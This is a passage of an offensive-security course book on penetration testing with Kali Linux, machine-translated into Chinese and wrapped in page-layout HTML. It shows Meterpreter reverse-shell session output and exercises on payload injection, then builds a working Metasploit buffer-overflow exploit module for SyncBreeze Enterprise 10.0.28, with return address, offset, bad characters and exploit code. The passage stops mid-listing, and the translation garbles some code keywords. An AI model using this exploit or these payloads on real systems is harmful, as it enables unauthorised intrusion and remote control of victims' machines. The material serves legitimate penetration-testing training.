<div style="position:absolute;top:104387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用 -j</font></font></font></b></nobr></div>
<div style="position:absolute;top:104404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业 0 运行的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:104437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:5555 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:104472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -i 5</font></font></font></b></nobr></div>
<div style="position:absolute;top:104489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 开始与 5 人互动...</font></font></nobr></div>
<div style="position:absolute;top:104522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运输下一个</font></font></font></b></nobr></div>
<div style="position:absolute;top:104539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 更改为下一次传输...</font></font></nobr></div>
<div style="position:absolute;top:104574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（179779 字节）到 10.11.0.22</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:104590;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功切换到下一个传输，杀死当前会话。</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:104719;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="89"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 89 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:104752;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:105829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:105829;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:105829;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">706</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22 - Meterpreter 会话 5 关闭。</font><font style="vertical-align: inherit;">原因：用户退出</font></font></nobr></div>
<div style="position:absolute;top:104898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:104916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 6 打开 (10.11.0.4:5555 -&gt; 10.11.0.22:50357)</font></font></nobr></div>
<div style="position:absolute;top:104949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -i 6</font></font></font></b></nobr></div>
<div style="position:absolute;top:104966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 开始与 6 互动...</font></font></nobr></div>
<div style="position:absolute;top:105000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:105020;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 787 - 更改为不同的传输类型</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们成功地切换了传输，创建了一个新的 Meterpreter 会话，并关闭了旧的</font></font></nobr></div>
<div style="position:absolute;top:105068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105103;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.7.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个暂存和非暂存的 Linux 二进制有效负载以在您的 Kali 系统上使用。</font></font></nobr></div>
<div style="position:absolute;top:105161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 设置 Netcat 侦听器并运行非暂存负载。</font><font style="vertical-align: inherit;">它有效吗？</font></font></nobr></div>
<div style="position:absolute;top:105189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 设置 Netcat 侦听器并运行暂存负载。</font><font style="vertical-align: inherit;">它有效吗？</font></font></nobr></div>
<div style="position:absolute;top:105218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 在你的 Windows 系统上获取一个 Meterpreter shell。</font><font style="vertical-align: inherit;">练习文件传输。</font></font></nobr></div>
<div style="position:absolute;top:105246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 将负载注入 plink.exe。</font><font style="vertical-align: inherit;">在您的 Windows 系统上测试它。</font></font></nobr></div>
<div style="position:absolute;top:105274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. 创建一个运行 Meterpreter 有效负载的可执行文件并在您的 Windows 上执行它</font></font></nobr></div>
<div style="position:absolute;top:105294;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统。</font></font></nobr></div>
<div style="position:absolute;top:105322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7. 建立 Meterpreter 连接后，设置新的传输类型并更改为它。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.4 构建我们自己的 MSF 模块</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使是最不熟练的程序员也可以构建自定义 MSF 模块。</font><font style="vertical-align: inherit;">Ruby 语言和</font></font></nobr></div>
<div style="position:absolute;top:105421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用结构清晰、直接，并且与 Python 非常相似。</font><font style="vertical-align: inherit;">为了展示这是如何工作的，我们</font></font></nobr></div>
<div style="position:absolute;top:105440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将我们的 SyncBreeze Python 漏洞利用移植到 Metasploit 格式，使用现有漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:105459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">framework作为模板，复制到home下建立的文件夹结构中</font></font></nobr></div>
<div style="position:absolute;top:105479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root 用户的目录。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mkdir -p /root/.msf4/modules/exploits/windows/http</font></font></font></b></nobr></div>
<div style="position:absolute;top:105547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/dis</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105564;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">k_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/.msf4/modules/exploits/windows/http$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nano /root/.msf4/modules/exploit</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105615;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s/windows/http/syncbreeze.rb</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105635;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 788 - 为漏洞利用创建模板</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将更新头信息，包括模块的名称、它的描述、</font></font></nobr></div>
<div style="position:absolute;top:105683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者和外部参考。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'名称'    </font></font></nobr></div>
<div style="position:absolute;top:105718;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt; 'SyncBreeze Enterprise 缓冲区溢出',</font></font></nobr></div>
<div style="position:absolute;top:105735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'说明' =&gt; %q(</font></font></nobr></div>
<div style="position:absolute;top:105752;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该模块将我们对 SyncBreeze Enterprise 10.0.28 的 Python 漏洞利用移植到 MSF。</font></font></nobr></div>
<div style="position:absolute;top:105769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">), </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:105907;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="90"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 90 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:105940;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:107017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:107017;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:107017;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">707</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'执照'    </font></font></nobr></div>
<div style="position:absolute;top:106036;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt; MSF_LICENSE，</font></font></nobr></div>
<div style="position:absolute;top:106052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'作者'    </font></font></nobr></div>
<div style="position:absolute;top:106052;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt; ['攻击性安全'，'offsec']，</font></font></nobr></div>
<div style="position:absolute;top:106069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'参考' =&gt;</font></font></nobr></div>
<div style="position:absolute;top:106086;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[</font></font></nobr></div>
<div style="position:absolute;top:106104;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">['教育局'，'42886']</font></font></nobr></div>
<div style="position:absolute;top:106120;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">],</font></font></nobr></div>
<div style="position:absolute;top:106140;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 789 - Metasploit 模块头信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下一节中，我们将选择默认选项。</font><font style="vertical-align: inherit;">在这种情况下，我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EXITFUNC</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为“线程”</font></font></nobr></div>
<div style="position:absolute;top:106188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并指定我们发现的坏字符，即\x00\x0a\x0d\x25\x26\x2b\x3d。</font><font style="vertical-align: inherit;">最后，在</font></font></nobr></div>
<div style="position:absolute;top:106208;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分，我们将指定 SyncBreeze 的版本以及 JMP ESP 的地址</font></font></nobr></div>
<div style="position:absolute;top:106227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令和用于覆盖 EIP 的偏移量。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'默认选项' =&gt;</font></font></nobr></div>
<div style="position:absolute;top:106279;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:106296;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'EXITFUNC' =&gt; '线程'</font></font></nobr></div>
<div style="position:absolute;top:106313;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">},</font></font></nobr></div>
<div style="position:absolute;top:106330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'平台' =&gt; '赢',</font></font></nobr></div>
<div style="position:absolute;top:106347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'有效载荷'    </font></font></nobr></div>
<div style="position:absolute;top:106347;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt;</font></font></nobr></div>
<div style="position:absolute;top:106364;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:106381;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'BadChars' =&gt; "\x00\x0a\x0d\x25\x26\x2b\x3d",</font></font></nobr></div>
<div style="position:absolute;top:106398;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'空格' =&gt; 500</font></font></nobr></div>
<div style="position:absolute;top:106415;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">},</font></font></nobr></div>
<div style="position:absolute;top:106432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'目标'    </font></font></nobr></div>
<div style="position:absolute;top:106432;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt;</font></font></nobr></div>
<div style="position:absolute;top:106449;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[</font></font></nobr></div>
<div style="position:absolute;top:106466;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">['SyncBreeze Enterprise 10.0.28',</font></font></nobr></div>
<div style="position:absolute;top:106483;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:106500;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'Ret' =&gt; 0x10090c83，#JMP ESP -- libssp.dll</font></font></nobr></div>
<div style="position:absolute;top:106516;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'偏移' =&gt; 780</font></font></nobr></div>
<div style="position:absolute;top:106533;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}]</font></font></nobr></div>
<div style="position:absolute;top:106551;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">],</font></font></nobr></div>
<div style="position:absolute;top:106570;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 790 - Metasploit 模块选项和设置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将更新</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能，这是通过向服务器执行 HTTP GET 请求来完成的。</font></font></nobr></div>
<div style="position:absolute;top:106619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网址 /. </font><font style="vertical-align: inherit;">在易受攻击的系统上，结果包含文本“Sync Breeze Enterprise v10.0.28”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义检查</font></font></nobr></div>
<div style="position:absolute;top:106671;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">res = send_request_cgi(</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:106687;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'uri' =&gt; '/' </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106704;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'方法' =&gt; '获取'</font></font></nobr></div>
<div style="position:absolute;top:106721;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)</font></font></nobr></div>
<div style="position:absolute;top:106755;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 res &amp;&amp; res.code == 200</font></font></nobr></div>
<div style="position:absolute;top:106772;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">product_name = res.body.scan(/( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sync Breeze Enterprise</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> v[^&lt;]*)/i).flatten.first</font></font></nobr></div>
<div style="position:absolute;top:106789;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 product_name =~ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/10\.0\.28/</font></font></font></b></nobr></div>
<div style="position:absolute;top:106806;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回漏洞利用::检查代码::出现</font></font></nobr></div>
<div style="position:absolute;top:106823;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:106840;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:106874;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回漏洞利用::检查代码::安全</font></font></nobr></div>
<div style="position:absolute;top:106891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:106910;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 791 - 我们模块的检查函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后一部分是漏洞利用本身。</font><font style="vertical-align: inherit;">首先，我们将创建利用偏移量的漏洞利用字符串</font></font></nobr></div>
<div style="position:absolute;top:106959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及 JMP ESP 指令的内存地址以及 NOP 雪橇和有效载荷。</font><font style="vertical-align: inherit;">然后</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:107095;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="91"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 91 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:107128;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:108205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:108205;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:108205;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">708</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 /login URL 通过 HTTP POST 请求发送精心制作的恶意字符串，如下所示</font></font></nobr></div>
<div style="position:absolute;top:107243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始漏洞利用。</font><font style="vertical-align: inherit;">我们将</font><font style="vertical-align: inherit;">使用漏洞利用字符串</font><font style="vertical-align: inherit;">填充 HTTP POST</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:107295;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">print_status("正在生成漏洞利用...")</font></font></nobr></div>
<div style="position:absolute;top:107312;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp = rand_text_alpha(目标['偏移'])</font></font></nobr></div>
<div style="position:absolute;top:107329;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; [target.ret].pack('V')</font></font></nobr></div>
<div style="position:absolute;top:107346;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; rand_text(4)</font></font></nobr></div>
<div style="position:absolute;top:107363;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; make_nops(10) # NOP sled 以确保我们登陆 jmp 到 shellcode</font></font></nobr></div>
<div style="position:absolute;top:107380;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; payload.encoded</font></font></nobr></div>
<div style="position:absolute;top:107414;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">print_status("发送漏洞利用...")</font></font></nobr></div>
<div style="position:absolute;top:107448;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">send_request_cgi(</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:107465;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'uri' =&gt; '/登录' </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107482;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'方法' =&gt; 'POST',</font></font></nobr></div>
<div style="position:absolute;top:107499;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'连接' =&gt; '保持活动'，</font></font></nobr></div>
<div style="position:absolute;top:107515;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'vars_post' =&gt; {</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:107532;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'用户名' =&gt; "#{exp}" </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107549;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'密码' =&gt; "fakepsw"</font></font></nobr></div>
<div style="position:absolute;top:107567;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:107584;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)</font></font></nobr></div>
<div style="position:absolute;top:107617;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理程序</font></font></nobr></div>
<div style="position:absolute;top:107634;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断开</font></font></nobr></div>
<div style="position:absolute;top:107651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:107671;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 792 - 利用 Metasploit 模块的功能</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将所有部分放在一起为我们提供了一个完整的 SyncBreeze Metasploit 漏洞利用模块</font></font></nobr></div>
<div style="position:absolute;top:107720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业漏洞：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">##</font></font></nobr></div>
<div style="position:absolute;top:107771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 这个模块需要Metasploit：http://metasploit.com/download</font></font></nobr></div>
<div style="position:absolute;top:107788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 当前来源：https://github.com/rapid7/metasploit-framework</font></font></nobr></div>
<div style="position:absolute;top:107805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">##</font></font></nobr></div>
<div style="position:absolute;top:107839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">class MetasploitModule &lt; Msf::Exploit::Remote</font></font></nobr></div>
<div style="position:absolute;top:107856;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">排名 = 优秀排名</font></font></nobr></div>
<div style="position:absolute;top:107890;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括 Msf::Exploit::Remote::HttpClient</font></font></nobr></div>
<div style="position:absolute;top:107924;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义初始化（信息 = {}）</font></font></nobr></div>
<div style="position:absolute;top:107941;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超级（更新信息（信息，</font></font></nobr></div>
<div style="position:absolute;top:107958;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'名称'    </font></font></nobr></div>
